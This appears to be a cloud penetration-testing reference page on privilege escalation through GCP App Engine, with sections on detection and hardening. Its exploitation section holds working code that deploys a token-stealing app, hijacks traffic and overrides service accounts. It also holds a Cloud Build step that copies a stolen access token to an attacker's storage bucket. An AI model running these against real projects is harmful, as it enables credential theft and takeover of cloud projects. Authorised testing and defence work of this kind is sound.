---
cstg_id: CSTG-GCP-APP-ENGINE-PRIVESC
title: "GCP App Engine - Privilege Escalation"
provider: gcp
service: app-engine
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - appengine.applications.get
  - appengine.applications.update
  - appengine.services.update
  - appengine.versions.create
  - appengine.versions.update
  - appengine.versions.get
  - appengine.instances.list
  - cloudbuild.builds.create
  - storage.objects.create
  - iam.serviceAccounts.actAs
  - iam.serviceAccounts.getAccessToken
tools:
  - Provider CLI (gcloud)
  - Provider REST API client (Admin API)
  - Cloud Storage client
  - Generic HTTP client
references:
  - https://cloud.google.com/appengine/docs/admin-api
  - https://cloud.google.com/iam/docs/service-accounts-actas
  - https://cloud.google.com/appengine/docs/standard/python3/configuration-files
  - https://cloud.google.com/compute/docs/metadata/overview
  - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
  - https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
  - https://hackingthe.cloud/gcp/
license: CC BY-SA 4.0
---

## Summary

App Engine is a high-value privilege-escalation target in GCP because of one structural
fact: **code deployed to App Engine runs as a service account**, and that service account
- the default `PROJECT_ID@appspot.gserviceaccount.com` - is granted the legacy **Editor**
role on the project unless an operator has changed it. Therefore, any principal who can
*deploy a new version*, *modify an existing version's code*, or *cause code to execute on
an instance* can run arbitrary code with the App Engine identity's privileges. When that
identity is project Editor (the default), this is a direct path to broad project
compromise.

Privilege escalation against App Engine generally takes one of these forms:

1. **Deploy/Update a version** containing attacker-controlled code, which then runs as the
   App Engine service account and reads its token from the metadata/App Identity service.
2. **Set or override a version's service account** (`actAs`) to a more privileged identity,
   then deploy code that operates as that identity.
3. **Shift traffic** to an attacker-created version (`Services.UpdateService`) so the
   malicious code receives requests.
4. **Pivot through the build pipeline** - deployment invokes Cloud Build, whose builder
   service account is itself frequently over-privileged.

This page builds on [GCP App Engine - Enumeration](../02-services/gcp-app-engine-enum.md),
which identifies the associated identities and their bound roles.

## Prerequisites

- An assumed-breach foothold: a principal (user, service account, or workload identity)
  holding one or more of the permissions listed in the frontmatter.
- The App Engine application must already exist in the project (a project holds at most one
  application; first-time creation requires `appengine.applications.create`).
- The App Engine Admin API and, for code deploys, the Cloud Build API enabled on the
  project.
- To set or override the per-version service account, the caller must hold
  `iam.serviceAccounts.actAs` on the *target* service account.

The decisive question for every technique below is: **what role does the identity that the
code will run as actually hold?** Enumerate that first
(`gcloud projects get-iam-policy` filtered to the appspot SA, plus any per-version override
SAs). If it is Editor/Owner or holds sensitive roles (`iam.securityAdmin`,
`iam.serviceAccountTokenCreator`, `resourcemanager.projectIamAdmin`), the escalation is
immediate.

## Enumeration

```bash
# What identity will deployed code run as?
gcloud app describe --format='value(serviceAccount)' --project "$PROJECT_ID"

# What roles does that identity hold? (default appspot SA shown)
gcloud projects get-iam-policy "$PROJECT_ID" --format=json \
  | jq -r '.bindings[] | select(.members[]
      | test("appspot.gserviceaccount.com")) | .role'

# Can I actAs / impersonate it, or any more-privileged SA?
gcloud iam service-accounts get-iam-policy \
  "${PROJECT_ID}@appspot.gserviceaccount.com" --project "$PROJECT_ID"

# Do I have the deploy/mutate permissions? (test with permissions check)
gcloud projects test-iam-permissions "$PROJECT_ID" \
  --permissions=appengine.versions.create,appengine.versions.update,\
appengine.services.update,iam.serviceAccounts.actAs,cloudbuild.builds.create
```

## Exploitation

### `appengine.versions.create` (deploy code as the App Engine service account)

The canonical primitive. Deploy a new version whose application code reads the running
service account's OAuth2 token and uses it - or simply performs privileged actions
directly. The deployed code runs as the application/appspot service account.

Minimal standard-environment payload (Python) that exfiltrates the running identity's
token from the metadata server:

```python
# main.py
import urllib.request
def app(environ, start_response):
    req = urllib.request.Request(
        "http://metadata.google.internal/computeMetadata/v1/"
        "instance/service-accounts/default/token",
        headers={"Metadata-Flavor": "Google"})
    token = urllib.request.urlopen(req).read()
    start_response("200 OK", [("Content-Type", "text/plain")])
    return [token]
```

```yaml
# app.yaml
runtime: python312
entrypoint: gunicorn -b :$PORT main:app
```

```bash
# Deploy; code now runs as PROJECT_ID@appspot.gserviceaccount.com (default: Editor)
gcloud app deploy app.yaml --project "$PROJECT_ID" --quiet \
  --version exploit --no-promote

# Reach the version directly (no traffic split needed) and capture the token
curl -s "https://exploit-dot-default-dot-${PROJECT_ID}.${REGION_ID}.r.appspot.com/"
```

With the returned access token, the operator can act as the App Engine identity for the
full extent of its roles - e.g. with default Editor, modify other resources, read storage,
create resources, or pivot. Because deployment goes through Cloud Build, the staged source
also lands in `staging.PROJECT_ID.appspot.com`.

Raw Admin API equivalent (no local CLI staging): upload the source files to the staging
bucket, then `POST .../services/default/versions` referencing them in
`deployment.files`.

### `appengine.versions.update` (modify existing version / serving config)

Where creating a fresh version is restricted or noisy, updating an existing version's
serving configuration or instance settings can still cause attacker influence over running
code, and updating a version lets the per-version `serviceAccount` and `envVariables` be
changed in some flows. Combined with `actAs`, this can re-point a version at a more
privileged identity.

```bash
curl -s -X PATCH \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://appengine.googleapis.com/v1/apps/${PROJECT_ID}/services/${SERVICE_ID}/versions/${VERSION_ID}?updateMask=servingStatus" \
  -d '{"servingStatus":"SERVING"}'
```

### `iam.serviceAccounts.actAs` on a more-privileged SA (service account override)

If the foothold identity can `actAs` a service account more privileged than the default
appspot SA, deploy a version pinned to that identity. The deployed code then runs with the
elevated identity's roles.

```yaml
# app.yaml - pin the version to a high-privilege SA the caller can actAs
runtime: python312
entrypoint: gunicorn -b :$PORT main:app
service_account: privileged-sa@${PROJECT_ID}.iam.gserviceaccount.com
```

```bash
gcloud app deploy app.yaml --project "$PROJECT_ID" \
  --service-account "privileged-sa@${PROJECT_ID}.iam.gserviceaccount.com" \
  --version pivot --no-promote --quiet
```

This is the App Engine instance of the general GCP `actAs`-to-compute escalation pattern:
attach a powerful identity to a compute resource you control and run code on it. The same
principle applies to Cloud Functions, Cloud Run, and Compute Engine.

### `appengine.services.update` (traffic splitting / hijack)

Redirect production traffic to an attacker-created version so the malicious code receives
live requests (and any request-borne credentials or session data), or to silently replace
the served application.

```bash
# Send 100% of traffic to the attacker version
gcloud app services set-traffic "$SERVICE_ID" \
  --splits exploit=1 --project "$PROJECT_ID" --quiet
```

Raw API:

```bash
curl -s -X PATCH \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://appengine.googleapis.com/v1/apps/${PROJECT_ID}/services/${SERVICE_ID}?updateMask=split" \
  -d '{"split":{"allocations":{"exploit":1}}}'
```

### `cloudbuild.builds.create` (pivot via the deployment build pipeline)

App Engine deployments are built by Cloud Build, which runs as
`PROJECT_NUMBER@cloudbuild.gserviceaccount.com`. That builder account is itself often
over-privileged (legacy default included broad roles). A caller with build-creation rights
can submit a build whose steps run arbitrary commands as the Cloud Build service account,
independent of the App Engine identity:

```bash
gcloud builds submit --no-source --project "$PROJECT_ID" \
  --config <(cat <<'YAML'
steps:
- name: gcr.io/cloud-builders/gcloud
  entrypoint: bash
  args: ['-c', 'gcloud auth print-access-token > /workspace/token.txt; gsutil cp /workspace/token.txt gs://attacker-bucket/']
YAML
)
```

Evaluate the Cloud Build SA's roles the same way as the appspot SA; if it holds Editor or
sensitive roles, this is an equivalent escalation path.

### `appengine.applications.update` (application-level identity / settings change)

Updating the application object can change the application-level `serviceAccount`,
`iap` configuration, and other global settings, affecting every service. Combined with
`actAs`, changing the application service account to a privileged identity broadens the
blast radius of subsequent deploys.

```bash
curl -s -X PATCH \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://appengine.googleapis.com/v1/apps/${PROJECT_ID}?updateMask=serviceAccount" \
  -d '{"serviceAccount":"privileged-sa@'"${PROJECT_ID}"'.iam.gserviceaccount.com"}'
```

### Post-exploitation: token extraction from a running instance

Any code execution obtained through the techniques above can mint tokens for the running
identity:

```bash
# Compute-metadata server (flexible env and underlying VM)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Identity / OIDC token for downstream service-to-service auth
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example"
```

These tokens are then usable from anywhere for the lifetime of the credential, decoupling
the attacker from the App Engine instance.

## Detection & Logging

All of the write operations above are recorded in **Cloud Audit Logs** (Admin Activity,
always on):

- `google.appengine.v1.Versions.CreateVersion` / `UpdateVersion` - new or modified code.
  Inspect the request for a `serviceAccount` override and unexpected `envVariables`.
- `google.appengine.v1.Services.UpdateService` - traffic splits / hijacks.
- `google.appengine.v1.Applications.UpdateApplication` - application-level identity or IAP
  changes.
- `iam.serviceAccounts.actAs` authorization events accompanying any version deploy that
  pins a service account - the `authorizationInfo` shows the `actAs` check on the target SA.
- Cloud Build: `google.devtools.cloudbuild.v1.CloudBuild.CreateBuild` plus the build's own
  step logs.
- Token minting from the App Identity / metadata server is generally **not** individually
  logged; detect via the *downstream* API calls the stolen token makes (those carry the
  appspot SA as `authenticationInfo.principalEmail`).

```bash
gcloud logging read \
  'protoPayload.serviceName="appengine.googleapis.com"
   AND protoPayload.methodName=("google.appengine.v1.Versions.CreateVersion"
     OR "google.appengine.v1.Services.UpdateService"
     OR "google.appengine.v1.Applications.UpdateApplication")' \
  --project "$PROJECT_ID" --freshness=7d
```

High-fidelity alerts: a version created with `serviceAccount` set to an identity not
normally used; a deploy by a principal that has never deployed before; traffic shifted to a
newly created version within minutes of its creation; and any `actAs` against a
high-privilege service account originating from an App Engine or Cloud Build deploy.

## Remediation & Hardening

- **Strip Editor from the appspot service account.** Replace the default
  `roles/editor` binding on `PROJECT_ID@appspot.gserviceaccount.com` with least-privilege
  roles, and assign a dedicated per-service identity via the version `serviceAccount` field.
- **Lock down `iam.serviceAccounts.actAs`.** Grant `actAs` only on the specific
  least-privilege service accounts each deployer needs; never broadly. This is the single
  most important control against the service-account-override path.
- **Restrict deploy permissions.** Treat `appengine.versions.create/update`,
  `appengine.services.update`, `roles/appengine.deployer`,
  `roles/appengine.serviceAdmin`, and `roles/cloudbuild.builds.editor` as high-privilege.
  Require approvals/separation of duties for production deploys.
- **Harden the Cloud Build service account.** Remove default broad roles from
  `PROJECT_NUMBER@cloudbuild.gserviceaccount.com`; use a dedicated build identity with
  minimal scope.
- **Constrain `actAs` org-wide** with the `iam.disableServiceAccountKeyCreation` and
  `iam.allowedPolicyMemberDomains` org policies where appropriate, and use IAM Conditions to
  scope deploys.
- **Enable Data Access audit logging** for App Engine and alert on the version/traffic
  mutations above.
- **Review and prune versions** so that traffic-hijack and forgotten-version risk is
  minimized; require IAP on sensitive services.
- **Detect token misuse** by monitoring API activity attributed to the appspot SA from
  unexpected source contexts or at unexpected volumes.

## Tools

- Provider CLI (`gcloud app deploy`, `gcloud app services set-traffic`,
  `gcloud builds submit`, `gcloud iam`) for deploy, traffic, build, and identity operations.
- Provider REST API client against the App Engine Admin API for direct version/service/
  application mutation and service-account override.
- Cloud Storage client for staging-bucket source upload used by raw API deploys.
- Generic HTTP client for reaching deployed exploit versions and querying the
  metadata/App Identity token endpoints.

## References

- App Engine Admin API: https://cloud.google.com/appengine/docs/admin-api
- `iam.serviceAccounts.actAs` / ActAs semantics: https://cloud.google.com/iam/docs/service-accounts-actas
- App Engine configuration files (`app.yaml`, service_account): https://cloud.google.com/appengine/docs/standard/python3/configuration-files
- Compute metadata server overview: https://cloud.google.com/compute/docs/metadata/overview
- Rhino Security Labs - GCP privilege escalation: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- GCP IAM privilege escalation methods: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
- Hacking the Cloud - GCP: https://hackingthe.cloud/gcp/
